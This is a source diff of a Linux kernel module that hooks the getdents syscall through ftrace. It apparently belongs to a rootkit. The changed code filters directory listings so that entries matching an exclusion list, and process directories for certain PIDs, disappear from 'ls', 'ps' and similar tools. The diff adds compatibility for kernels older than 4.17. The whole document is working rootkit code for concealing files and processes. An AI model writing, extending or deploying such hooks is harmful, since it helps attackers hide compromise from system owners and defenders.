@@ -4,46 +4,60 @@
 #include "utils/ftrace_utils.h"
 #include "hooks/x64_sys_getdents.h"
 
-// Pointer to the original getdents syscall
-asmlinkage long (*orig_getdents)(const struct pt_regs *);
 
-// Hook function for getdents
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
+asmlinkage long (*orig_getdents)(unsigned int fd, char __user *dirp, unsigned int count);
+asmlinkage long hook_getdents(unsigned int fd, char __user *dirp, unsigned int count)
+{
+    long ret = orig_getdents(fd, dirp, count);
+    return hook_getdents_impl(fd, dirp, ret);
+}
+#else
+asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
 asmlinkage int hook_getdents(const struct pt_regs *regs)
 {
-    long ret; // Total bytes returned by getdents
+    unsigned int fd = regs->di;
+    char __user *dirp = (char __user *)regs->si;
+    long ret = orig_getdents(regs);
+    return hook_getdents_impl(fd, dirp, ret);
+}
+#endif
+
+
+long hook_getdents_impl(unsigned int fd, char __user *dirp, long ret)
+{
+    long new_ret = ret; // Total bytes after filtering
     unsigned long offset = 0;
     unsigned long bytes_left;
     struct linux_dirent64 *d, *kdirent, *kdirent_orig;
-    char *dirp = (char *)regs->si;
-    
-    ret = orig_getdents(regs);
-    if (ret <= 0)
-        return ret;
 
-    kdirent = kmalloc(ret, GFP_KERNEL);
+    if (new_ret <= 0)
+        return new_ret;
+
+    kdirent = kmalloc(new_ret, GFP_KERNEL);
     if (!kdirent)
-        return ret;
+        return new_ret;
 
-    kdirent_orig = kmalloc(ret, GFP_KERNEL);
+    kdirent_orig = kmalloc(new_ret, GFP_KERNEL);
     if (!kdirent_orig) {
         kfree(kdirent);
-        return ret;
+        return new_ret;
     }
 
-    if (copy_from_user(kdirent, dirp, ret)) {
+    if (copy_from_user(kdirent, dirp, new_ret)) {
         kfree(kdirent);
         kfree(kdirent_orig);
-        return ret;
+        return new_ret;
     }
-    memcpy(kdirent_orig, kdirent, ret);
+    memcpy(kdirent_orig, kdirent, new_ret);
 
-    bytes_left = ret;
+    bytes_left = new_ret;
     while (bytes_left > 0) {
         d = (struct linux_dirent64 *)((char *)kdirent + offset);
         size_t shift_by = 0;
 
         if (str_entry_is_excluded(d->d_name)) {
-            shift_by = d->d_reclen; 
+            shift_by = d->d_reclen;
             goto shift_and_iter;
         } else if (is_numeric(d->d_name)) {
             int pid;
@@ -69,7 +83,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
 shift_and_iter:
         if (shift_by > 0) {
             memmove(d, (char *)d + shift_by, bytes_left - shift_by);
-            ret -= shift_by;
+            new_ret -= shift_by;
             bytes_left -= shift_by;
         } else {
             offset += d->d_reclen;
@@ -78,15 +92,16 @@ shift_and_iter:
         continue;
     }
 
-    if (copy_to_user(dirp, kdirent, ret)) {
-        if (copy_to_user(dirp, kdirent_orig, ret)) {} // do nothing - suppress warnings
+    if (copy_to_user(dirp, kdirent, new_ret)) {
+        if (copy_to_user(dirp, kdirent_orig, new_ret)) {
+            // suppress warnings
+        }
         kfree(kdirent_orig);
         kfree(kdirent);
-        return ret;
+        return new_ret;
     }
 
     kfree(kdirent_orig);
     kfree(kdirent);
-    return ret;
+    return new_ret;
 }
-
